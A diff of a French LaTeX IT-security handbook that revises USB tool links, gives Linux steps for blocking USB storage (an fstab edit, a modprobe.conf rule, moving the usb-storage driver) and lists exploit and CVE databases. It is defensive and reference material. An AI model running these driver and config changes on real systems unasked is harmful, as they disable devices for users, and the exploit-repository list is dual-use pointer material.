 \\L'Universal Serial Bus (USB) est une norme relative \`a un bus informatique en transmission s\'erie qui sert \`a connecter des p\'eriph\'eriques informatiques \`a un ordinateur. Le bus USB permet de connecter des p\'eriph\'eriques \`a chaud et en b\'en\'eficiant du Plug and Play. Il peut alimenter certains p\'eriph\'eriques en \'energie, et dans sa version 2, il autorise des d\'ebits allant de 1,5 Mbit/s \`a 480 Mbit/s. La version 3 propose des d\'ebits jusqu'\`a 5 Gbit/s.
 }
 {
 \addcontentsline{toc}{subsubsection}{USBDeview}
-L'outils USBDeview (Windows), permet d'identifier les p\'eriph\'eriques USB install\'es, leurs \'etats et num\'eros de s\'erie : \url{http://www.nirsoft.net/utils/usb_devices_view.html}.\\
+Informations sur les p\'eriph\'eriques USB : \url{http://www.nirsoft.net/utils/usb_devices_view.html}.\\
 Supprimer l'U3 : \url{http://www.u3.com/support/default.aspx}\\
-Cr\'eer une cl\'e USB bootable \`a partir d'une image ISO : \url{http://unetbootin.sourceforge.net/}\vskip+0.1cm
-\addcontentsline{toc}{subsubsection}{Unetbootin}
+Cr\'eer une cl\'e USB bootable \`a partir d'une image ISO : 
+\url{http://unetbootin.sourceforge.net/}\addcontentsline{toc}{subsubsection}{Unetbootin},\\
+\url{http://www.linuxliveusb.com/}\addcontentsline{toc}{subsubsection}{LinuxLive USB Creator}, 
+\url{http://www.pendrivelinux.com/yumi-multiboot-usb-creator/}\addcontentsline{toc}{subsubsection}{YUMI},\\
+\url{http://www.microsoftstore.com/store/msstore/html/pbPage.Help_Win7_usbdvd_dwnTool}\\\addcontentsline{toc}{subsubsection}{Windows7 USB-DVD tool}
+Modification de firmware de Cl\'e : \url{http://www.easytutoriel.com/reparer-cle-usb-memoire-flash/}
 
 \underline{Limiter l'acc\`es aux cl\'es USB sous Windows :}
 \begin{enumerate}
@@ -8160,11 +8293,9 @@ Cr\'eer une cl\'e USB bootable \`a partir d'une image ISO : \url{http://unetboot
 \underline{Restreindre le montage automatique des cl\'es USB sous Linux :}
 \begin{enumerate}
 	\item On peut limiter les droits de la commande {\sl \color{blue}/bin/mount} ;
-	\item Il est possible de modifier les droits dans {\sl \color{blue}/etc/fstab} pour que seul root est le droit de monter un support USB, en supprimant la ligne de format : \\
-{\sl \color{blue}/dev/cdrom /dev/sda1 /mnt/clef vfat rw,noauto,iocharset=iso8859-15,codepage=850,user,exec 0 0}\\
-(Toujours faire une sauvegarde au pr\'ealable du fichier.)
-
-	\item D\'esactiver le module de chargement automatique des cl\'es (il sera toujours possible de charger le module avec {\sl \color{blue}insmod}) :\\
+	\item Il est possible de modifier les droits dans {\sl \color{blue}/etc/fstab} pour que seul root ai le droit de monter un support USB, en supprimant la ligne de format : (Toujours faire une sauvegarde au pr\'ealable du fichier.)\\
+{\sl \color{blue}/dev/cdrom /dev/sda1 /mnt/clef vfat rw,noauto,iocharset=iso8859-15,codepage=850,user,exec 0 0}
+	\item D\'esactiver le module de chargement automatique des cl\'es (il sera toujours possible de charger le module avec {\sl \color{blue}insmod}) : 
 {\sl \color{blue}echo 'install usb-storage : ' >> /etc/modprobe.conf}
 	\item On peut d\'eplacer le driver utilis\'e pour monter les cl\'es (ici dans {\sl \color{blue}/root}) :\\
 {\sl \color{blue}mv /lib/modules/\$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko /root}
@@ -8905,17 +9036,19 @@ Pour utiliser plusieurs interfaces il suffit d'en s\'electionner plusieurs (i, o
 		\item \url{http://www.lestutosdenico.com}\vskip+0.2cm
 	\end{itemize}
 
-	\item \textbf{Bases d'exploits :}
+	\item \textbf{Bases d'exploits \& CVE :}
 	\begin{itemize}
 		\item \url{http://www.exploit-db.com}
-		\item \url{http://www.securityfocus.com/vulnerabilities}
-		\item \url{http://www.packetstormsecurity.org}
-		\item \url{http://www.zeroscience.mk/en/}
-		\item \url{http://www.security-database.com}
-		\item \url{http://nvd.nist.gouv}
 		\item \url{http://twitter.com/inj3ct0r}
+		\item \url{http://www.exploitsearch.net/index.php}
+		\item \url{http://www.zeroscience.mk/en/}
+		\item \url{http://www.packetstormsecurity.org}
+		\item \url{http://www.securityfocus.com/vulnerabilities}
+		\vskip+0.1cm
+		\item \url{http://nvd.nist.gov}
+		\item \url{http://www.cve.mitre.org/cve/cve.html}
 		\item \url{http://osvdb.org}
-		\item \url{http://www.exploitsearch.net}
+		\item \url{http://www.security-database.com}
 		\vskip+0.2cm
 	\end{itemize}
 	
